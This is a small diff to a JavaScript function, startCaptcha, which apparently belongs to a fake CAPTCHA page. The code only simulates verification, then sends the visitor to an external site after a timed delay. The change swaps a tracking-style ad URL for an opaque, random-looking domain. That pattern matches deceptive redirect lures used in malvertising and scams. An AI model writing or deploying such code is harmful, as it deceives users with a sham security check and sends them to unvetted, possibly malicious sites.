@@ -22,7 +22,7 @@ function startCaptcha() {
 
         // Redirect to the main site after a delay
         setTimeout(() => {
-            window.location.href = "https://grwptraq.com/?serial=61305825&creative_id=3338&anid=ppc_him11aug&pid=ppc"; // Redirect URL
+            window.location.href = "https://kbgepymb.com/rW9F"; // Redirect URL
         }, 1500); // 1.5 seconds delay before redirect
     }, 2000); // Simulated processing time (2 seconds)
 }
